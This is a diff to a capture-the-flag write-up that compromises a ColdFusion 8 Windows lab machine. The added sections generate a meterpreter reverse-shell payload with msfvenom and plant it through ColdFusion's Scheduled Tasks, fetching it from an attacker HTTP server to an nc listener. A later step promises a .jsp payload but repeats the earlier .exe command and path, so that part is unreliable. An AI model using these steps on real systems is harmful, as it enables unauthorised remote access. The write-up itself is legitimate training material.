@@ -15,9 +15,9 @@
 
 ### 6. Enumerating ColdFusion Administrative Page
 
-### 7. Attacking Machine by Uploading Payload
+### 7. Attacking Machine by Uploading Payload Attempt 1: fck_editor Exploit
 
-### 8. 
+### 8. Attacking Machine by Uploading Payload Attempt 2: Scheduled Tasks
 
 # Attack
 ## 1. NMAP
@@ -446,7 +446,7 @@ Printers 	Microsoft XPS Document Writer
 ```
 Perfect. We now know it's a Windows Vista 6.1, running ColdFusion v8.0.1.195765 & JVM v1.6.0_04. We also know there is a user `tolis`, path `C:\Users\tolis`.
 
-## 7. Attacking Machine by Uploading Payload
+## 7. Attacking Machine by Uploading Payload Attempt 1: fck_editor Exploit
 As we noted previously, it is perhaps time to deploy the [exploit with Metasploit module](https://www.rapid7.com/db/modules/exploit/windows/http/coldfusion_fckeditor/) titled `ColdFusion 8.0.1 Arbitrary File Upload and Execute` to upload a payload.
 ```
 msf5 > use exploit/windows/http/coldfusion_fckeditor
@@ -501,6 +501,7 @@ Within seconds of `[*] Sending our POST request...`, it returned with `[-] Uploa
 
 At this point, I am lost and looked online for guidance. The official documentation & [IppSec](https://www.youtube.com/watch?v=e9lVyFH7-4o&feature=emb_title&ab_channel=IppSec) managed to still use this `exploit/windows/http/coldfusion_fckeditor` exploit, with the use of Burp Suite. "However, due to the request delay to the target, the Metasploit module fails to run and must be intercepted in Burp Suite, then requested through Burp Repeater." 
 
+## 8. Attacking Machine by Uploading Payload Attempt 2: Scheduled Tasks
 Not wanting to use the Burp suite method, I followed an alternative method as seen from other writeups. Turns out, I missed out a tool I could leverage on from the ColdFusion administrator site.
 ```
 Debugging & Logging
@@ -518,8 +519,95 @@ Scheduled Tasks! We could use this to download and run our reverse shell payload
 
 Let's create a payload.
 ```
+hippoeug@kali:~$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=4545 -f exe -o meterpreter.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe file: 7168 bytes
+Saved as: meterpreter.exe
 ```
 
 Let's Schedule New Task.
 ```
+Task Name: Reverse Shell
+Frequency: Daily every 1 Min 1 Sec Start 6:22 μμ
+URL: http://10.10.x.x/meterpreter.exe
+Publish: Save output to a file
+File: C:\Users\tolis\meterpreter.exe
+Submit
 ```
+This task was scheduled successfully.
+
+Let's run the Python HTTPServer also.
+```
+hippoeug@kali:~$ sudo python -m SimpleHTTPServer 80
+```
+And a nc listener.
+```
+hippoeug@kali:~$ nc -lvnp 4545
+listening on [any] 4545 ...
+```
+
+Upon pressing the "Run Scheduled Task" button, it ran successfully with the message "This scheduled task was completed successfully.".
+
+However, we are not able to execute this `meterpreter.exe` we just placed, as we do not have access to the file path.
+Getting the payload in the location user Tolis directory isn't an issue, but running it is.
+
+We need to find a path that we have access to from the browser. Navigating to Mappings under Server Settings, we see 2 paths.
+```
+Server Settings 
+	Settings
+	Request Tuning
+	Caching
+	Client Variables
+	Memory Variables
+   ---->Mappings
+	Mail
+	Charting
+	Font Management
+	Java and JVM
+	Settings Summary
+	
+Active ColdFusion Mappings
+Actions 	Logical Path 	Directory Path
+  		/CFIDE  	C:\ColdFusion8\wwwroot\CFIDE 
+Edit Delete   	/gateway  	C:\ColdFusion8\gateway\cfc
+```
+
+Let's Schedule New Task again.
+```
+Task Name: Reverse Shell
+Frequency: Daily every 1 Min 1 Sec Start 6:22 μμ
+URL: http://10.10.x.x/meterpreter.exe
+Publish: Save output to a file
+File: C:\ColdFusion8\wwwroot\CFIDE\meterpreter.exe
+Submit
+```
+This task was scheduled successfully.
+
+Upon pressing the "Run Scheduled Task" button, it ran successfully with the message "This scheduled task was completed successfully.".
+
+To execute the payload we just placed, we need to go to the browser and navigate to `10.10.10.11:8500/CFIDE/meterpreter.exe`. However instead of running it, our browser attempts to download the `meterpreter.exe` payload instead. We need to find a file extension that Adobe ColdFusion is willing to run. Upon some research, we found that ColdFusion will execute `[.cfm](https://reboare.gitbooks.io/security/content/webshell.html)` & `.jsp` files.
+
+Since msfvenom allows for creation of `.jsp` webshell easily, we'll create a `.jsp` payload instead.
+```
+hippoeug@kali:~$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=4545 -f exe -o meterpreter.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe file: 7168 bytes
+Saved as: meterpreter.exe
+```
+
+Let's Schedule New Task.
+```
+Task Name: Reverse Shell
+Frequency: Daily every 1 Min 1 Sec Start 6:22 μμ
+URL: http://10.10.x.x/meterpreter.exe
+Publish: Save output to a file
+File: C:\Users\tolis\meterpreter.exe
+Submit
+```
+This task was scheduled successfully.
